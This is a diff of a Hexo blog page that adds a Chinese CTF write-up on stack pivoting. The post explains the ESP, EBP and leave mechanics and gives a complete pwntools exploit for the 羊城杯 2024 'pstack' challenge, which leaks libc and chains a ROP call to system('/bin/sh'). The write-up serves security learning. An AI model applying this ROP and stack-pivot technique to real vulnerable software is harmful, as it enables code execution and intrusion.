@@ -6,17 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://blog.zyp0422.mom">
-  <title>Archives | zhou</title>
+  <title>pwn-栈迁移 | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="zhou">
-<meta property="og:url" content="https://blog.zyp0422.mom/archives/page/5/index.html">
+  <meta name="description" content="相关指令以及一些栈内容介绍1234567EBP：栈底指针，又称为栈基址EIP：用于存放当前代码段，及下一条被执行指令的地址ESP：栈顶指针，永远指向栈顶leave指令：主要作用是将栈帧指针恢复到调用函数时的状态，实际时mov esp,ebp和pop ebp两个指令的结合，一般过程为恢复栈指针和恢复调用者的栈基址mov esp,ebp：esp在函数执行过程中会移动到栈的不同位置，这一步是将栈顶指针恢">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-栈迁移">
+<meta property="og:url" content="https://blog.zyp0422.mom/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
 <meta property="og:site_name" content="zhou">
+<meta property="og:description" content="相关指令以及一些栈内容介绍1234567EBP：栈底指针，又称为栈基址EIP：用于存放当前代码段，及下一条被执行指令的地址ESP：栈顶指针，永远指向栈顶leave指令：主要作用是将栈帧指针恢复到调用函数时的状态，实际时mov esp,ebp和pop ebp两个指令的结合，一般过程为恢复栈指针和恢复调用者的栈基址mov esp,ebp：esp在函数执行过程中会移动到栈的不同位置，这一步是将栈顶指针恢">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/1.png">
+<meta property="article:published_time" content="2024-09-27T06:26:05.000Z">
+<meta property="article:modified_time" content="2024-09-27T07:10:28.261Z">
 <meta property="article:author" content="zhoupeng">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -326,575 +333,286 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-pwn-栈迁移" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E7%AC%AC%E4%B8%80%E9%81%93reverse/" class="archive-article-date">
-        <time datetime="2024-05-08T04:31:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-08</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E7%AC%AC%E4%B8%80%E9%81%93reverse/" target="_blank">第一道reverse</a>
   
+    <h1 class="article-title" itemprop="name">
+      pwn-栈迁移
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/" class="archive-article-date">
+        <time datetime="2024-09-27T06:26:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-09-27</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">911字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">3分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+	
+		<h3 id="相关指令以及一些栈内容介绍"><a href="#相关指令以及一些栈内容介绍" class="headerlink" title="相关指令以及一些栈内容介绍"></a>相关指令以及一些栈内容介绍</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">EBP</span>：栈底指针，又称为栈基址</span><br><span class="line"><span class="selector-tag">EIP</span>：用于存放当前代码段，及下一条被执行指令的地址</span><br><span class="line"><span class="selector-tag">ESP</span>：栈顶指针，永远指向栈顶</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">leave</span>指令：主要作用是将栈帧指针恢复到调用函数时的状态，实际时<span class="selector-tag">mov</span> <span class="selector-tag">esp</span>,<span class="selector-tag">ebp</span>和<span class="selector-tag">pop</span> <span class="selector-tag">ebp</span>两个指令的结合，一般过程为恢复栈指针和恢复调用者的栈基址</span><br><span class="line"><span class="selector-tag">mov</span> <span class="selector-tag">esp</span>,<span class="selector-tag">ebp</span>：<span class="selector-tag">esp</span>在函数执行过程中会移动到栈的不同位置，这一步是将栈顶指针恢复到当前栈基址<span class="selector-tag">ebp</span>所指的位置（恢复栈指针）</span><br><span class="line"><span class="selector-tag">pop</span> <span class="selector-tag">ebp</span>：从调用者中弹出栈基址，并恢复到<span class="selector-tag">ebp</span>寄存器中（恢复调用者的栈基址）</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="介绍和原理"><a href="#介绍和原理" class="headerlink" title="介绍和原理"></a>介绍和原理</h3><p>栈迁移（Stack Overflow）一般应用在存在栈溢出，但是溢出长度不足以容纳我们构建的payload时；一般这种情况下栈溢出仅可以覆盖EBP、EIP。由于栈溢出的空间长度不足，需要将栈迁移到一个我们能够控制的内存区域，从而执行我们构造的shellcode或者ROP链。</p>
+<h4 id="典型的栈迁移场景"><a href="#典型的栈迁移场景" class="headerlink" title="典型的栈迁移场景"></a>典型的栈迁移场景</h4><ul>
+<li><strong>栈溢出不可控：</strong>程序的栈被破坏或者栈空间不够容纳复杂的ROP时，需要将栈迁移到其他可控的区域（例如：bss段或者其他已知可写地址）</li>
+<li><strong>绕过保护机制：</strong>某些保护机制会检测栈溢出的操作，栈迁移可以绕过这些机制，比如我们无法直接执行栈上的代码时，迁移到栈的另一个内存区域可能允许我们避开这类检测</li>
+</ul>
+<p><img src="/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/1.png"></p>
+<p>如上图，栈执行命令一般是从esp开始向ebp执行的，及从低地址向高地址逐条执行的，正常情况下退出栈后，就如图片所示，ESP指向EBP的位置，而EBP指向ebp原先所存储的地址（这里时0X400A0）</p>
+<p>栈迁移：通过控制EBP的值，借助leave指令，间接控制ESP的值，正常退出栈应该时图中所显示，但是如果我们覆盖EIP再次执行leave指令，ESP将会指向0x400A0的位置，也就是将栈迁移到了0x400A0。通过提前设置EBP中的地址和调用leave指令就可以完成连续多次栈迁移</p>
+<h3 id="判断栈迁移的实施条件"><a href="#判断栈迁移的实施条件" class="headerlink" title="判断栈迁移的实施条件"></a>判断栈迁移的实施条件</h3><ul>
+<li>存在leave ret这类gadget指令</li>
+<li>存在可执行shellcode的内存区域</li>
+</ul>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>羊城杯2024–pstack</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">pwn</span> <span class="selector-tag">import</span> *</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> <span class="selector-tag">import</span> <span class="selector-tag">sleep</span></span><br><span class="line"><span class="selector-tag">context</span>(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">elf</span> = <span class="selector-tag">ELF</span>(<span class="string">&#x27;./pstack&#x27;</span>)</span><br><span class="line"><span class="selector-tag">libc</span> = <span class="selector-tag">ELF</span>(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="selector-tag">p</span> = <span class="selector-tag">process</span>(<span class="string">&#x27;./pstack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">vuln_read</span> = <span class="number">0</span><span class="selector-tag">x4006C4</span></span><br><span class="line"><span class="selector-tag">leave_ret</span> = <span class="number">0</span><span class="selector-tag">x4006db</span></span><br><span class="line"><span class="selector-tag">pop_rdi</span> = <span class="number">0</span><span class="selector-tag">x400773</span></span><br><span class="line"><span class="selector-tag">pop_rbp</span> = <span class="number">0</span><span class="selector-tag">x4005b0</span></span><br><span class="line"><span class="selector-tag">ret</span> = <span class="number">0</span><span class="selector-tag">x400506</span></span><br><span class="line"><span class="selector-tag">puts_got</span> = <span class="selector-tag">elf</span><span class="selector-class">.got</span><span class="selector-attr">[<span class="string">&#x27;puts&#x27;</span>]</span></span><br><span class="line"><span class="selector-tag">puts_plt</span> = <span class="selector-tag">elf</span><span class="selector-class">.plt</span><span class="selector-attr">[<span class="string">&#x27;puts&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">bss</span>=<span class="selector-tag">elf</span><span class="selector-class">.bss</span>()+<span class="number">0</span><span class="selector-tag">x500</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">payload1</span> = <span class="selector-tag">b</span>&#x27;<span class="selector-tag">a</span>&#x27;*(<span class="number">0</span>x30) + <span class="selector-tag">p64</span>(bss+<span class="number">0</span>x30) + <span class="selector-tag">p64</span>(vuln_read)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.send</span>(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">payload2</span> = <span class="selector-tag">p64</span>(pop_rdi) + <span class="selector-tag">p64</span>(puts_got) + <span class="selector-tag">p64</span>(puts_plt) # <span class="selector-tag">leak-libc</span></span><br><span class="line"><span class="selector-tag">payload2</span> += <span class="selector-tag">p64</span>(pop_rbp) + <span class="selector-tag">p64</span>(bss+<span class="number">0</span>x200+<span class="number">0</span>x30) + <span class="selector-tag">p64</span>(vuln_read)</span><br><span class="line"><span class="selector-tag">payload2</span> += <span class="selector-tag">p64</span>(bss-<span class="number">8</span>) + <span class="selector-tag">p64</span>(leave_ret)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.send</span>(payload2)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.recvuntil</span>(b<span class="string">&#x27;flow?\n&#x27;</span>)</span><br><span class="line"><span class="selector-tag">puts_real</span> = <span class="selector-tag">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&#x27;\n&#x27;</span>,drop=True)[<span class="attribute">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="selector-tag">libc_base</span> = <span class="selector-tag">puts_real</span> <span class="selector-tag">-</span> <span class="selector-tag">libc</span><span class="selector-class">.sym</span><span class="selector-attr">[<span class="string">&#x27;puts&#x27;</span>]</span></span><br><span class="line"><span class="selector-tag">system_real</span> = <span class="selector-tag">libc_base</span> + <span class="selector-tag">libc</span><span class="selector-class">.sym</span><span class="selector-attr">[<span class="string">&#x27;system&#x27;</span>]</span></span><br><span class="line"><span class="selector-tag">binsh</span> = <span class="selector-tag">libc_base</span> + <span class="selector-tag">next</span>(libc.<span class="built_in">search</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">success</span>(<span class="string">&#x27;puts_real:&#x27;</span>+<span class="built_in">hex</span>(puts_real))</span><br><span class="line"><span class="selector-tag">success</span>(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="selector-tag">success</span>(<span class="string">&#x27;system_real:&#x27;</span>+<span class="built_in">hex</span>(system_real))</span><br><span class="line"><span class="selector-tag">success</span>(<span class="string">&#x27;str_bin_sh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">payload3</span> = (<span class="built_in">p64</span>(pop_rdi) + <span class="built_in">p64</span>(binsh) + <span class="built_in">p64</span>(system_real))<span class="selector-class">.ljust</span>(<span class="number">0</span>x30,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="selector-tag">payload3</span> += <span class="selector-tag">p64</span>(bss+<span class="number">0</span>x200-<span class="number">0</span>x8) + <span class="selector-tag">p64</span>(leave_ret)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.sendline</span>(payload3)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<p>详细将文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon/article/details/141632972">【PWN · 栈迁移 | one-read】[羊城杯 2024]pstack</a></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>相较之前学的栈溢出，这个有点难</li>
+<li>原理差不多能懂，具体例子的时候有些不懂，对于需要动态调试的内容出地址还是不太清楚（需要加强动态调试的能力）</li>
+</ul>
+
+	
+
+
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          zhoupeng
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://blog.zyp0422.mom/pwn-栈迁移/" title="pwn-栈迁移" target="_blank">https://blog.zyp0422.mom/pwn-栈迁移/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
+        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://blog.zyp0422.mom/pwn-%E6%A0%88%E8%BF%81%E7%A7%BB/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/NISACTF-2022-babyupload/" class="archive-article-date">
-        <time datetime="2024-04-08T13:23:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-08</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/Mr-Robot/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mr-Robot</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/NISACTF-2022-babyupload/" target="_blank">NISACTF-2022-babyupload</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%A0%88%E5%86%85%E5%AE%B9%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">相关指令以及一些栈内容介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">介绍和原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E7%9A%84%E6%A0%88%E8%BF%81%E7%A7%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">2.1.</span> <span class="toc-text">典型的栈迁移场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E6%96%BD%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">判断栈迁移的实施条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/Tabby-%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E7%A5%9E%E5%99%A8/" class="archive-article-date">
-        <time datetime="2024-04-07T10:43:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-07</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/Tabby-%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E7%A5%9E%E5%99%A8/" target="_blank">Tabby-终端控制神器</a>
-  
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Tabby//" class="article-tag-list-link color1">Tabby</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" class="archive-article-date">
-        <time datetime="2024-04-06T08:17:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-06</time>
-</a>
 
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" target="_blank">hexo上传文件无法显示</a>
-  
-    </h1>
-  
+<div id="SOHUCS" sid="pwn-栈迁移" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cyxqVIfAY",
+        conf: "3d1d672de8790c6875f19d013bc4ff6f"
+    });
+</script>
+</script>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/hexo//" class="article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/Kali-%E9%9D%99%E6%80%81IP/" class="archive-article-date">
-        <time datetime="2024-04-06T07:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-06</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/Kali-%E9%9D%99%E6%80%81IP/" target="_blank">Kali-静态IP</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/kali//" class="article-tag-list-link color5">kali</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="archive-article-date">
-        <time datetime="2024-04-02T02:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank">命令执行</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">命令执行</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" class="archive-article-date">
-        <time datetime="2024-04-02T02:16:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" target="_blank">[qsnctf]文章管理系统</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-        <time datetime="2024-04-01T04:50:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-01</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
